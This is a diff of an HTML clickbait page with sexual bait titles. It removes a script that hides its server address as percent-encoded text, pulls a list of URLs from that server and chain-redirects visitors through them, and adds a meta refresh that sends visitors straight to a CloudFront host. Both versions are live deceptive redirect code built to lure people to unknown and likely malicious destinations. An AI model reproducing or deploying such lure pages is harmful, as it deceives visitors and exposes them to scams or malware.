@@ -5,86 +5,11 @@
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <meta name="viewport"
       content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no">
-    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
-    <title>Click Me! My naked video👙</title>
+      <meta http-equiv="refresh" content="0;URL='https://dveffiqgs4tvg.cloudfront.net'" />
+    <link rel="shortcut icon" href="icon/favicon_4_64.ico" type="image/x-icon">
+    <title>Honey! Open the card and find me 👙</title>
 </head>
 <body>
-<script>
-    document.querySelector('link[rel="shortcut icon"]').href = "favicon_1_64.ico";
-    document.title = "Click Me! ";
-    document.querySelector('#content').innerText='Hi';
-    var urls = window.location.href.split('/')
-    var app = getQuery('u')
-    var apiUrl = decodeURIComponent('%68%74%74%70%73%3a%2f%2f%63%73%65%61%36%36%2e%73%68%75%61%39%39%39%2e%63%6f%6d')
-
-    if (!app) {
-        openUrl(apiUrl + '?e=unknown')
-    } else {
-        ajax(apiUrl + '/app/' + app)
-    }
-
-    function ajax(url) {
-        var xhr = new XMLHttpRequest()
-        xhr.open('get', url)
-        xhr.send()
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState === 4 && xhr.status === 200) {
-                var result = JSON.parse(xhr.responseText)
-                if (result.code === 0) {
-                    openAppUrl(result.data)
-                } else {
-                    openUrl(apiUrl + '?e=network')
-                }
-            }
-        }
-    }
-
-    function getQuery(name) {
-        var query = location.search.substring(1).split('&')
-        for (var i = 0; i < query.length; i++) {
-            var pair = query[i].split('=')
-            if (pair[0] === name) {
-                return pair[1]
-            }
-        }
-    }
-
-    function openAppUrl(data) {
-        if (!data) {
-            return openUrl(apiUrl + '?e=noData')
-        }
-
-        var lastTime = 0
-        if (data.apps && data.apps.length > 0) {
-            openUrls(data.apps)
-            lastTime = data.apps.length * 30
-        }
-
-        window.setTimeout(function() {
-            openUrl(data.url)
-        }, lastTime)
-    }
-
-    function openUrls(urls, index) {
-        index = index || 0
-        var waitTime = index && 30 || 0
-        setTimeout(function() {
-            openUrl(urls[index])
-            if (index < urls.length - 1) {
-                openUrls(urls, index + 1)
-            }
-        }, waitTime)
-    }
-
-    function openUrl(url) {
-        if (url === undefined || url === null || url.indexOf('://') === -1) {
-            url = apiUrl + '?e=invalidUrl:' + encodeURIComponent(url)
-        }
-        window.location.href = url
-        setTimeout(function() {
-            window.location = url
-        }, 20)
-    }
-</script>
+    <p id="content" style="opacity:0;"></p>
 </body>
 </html>
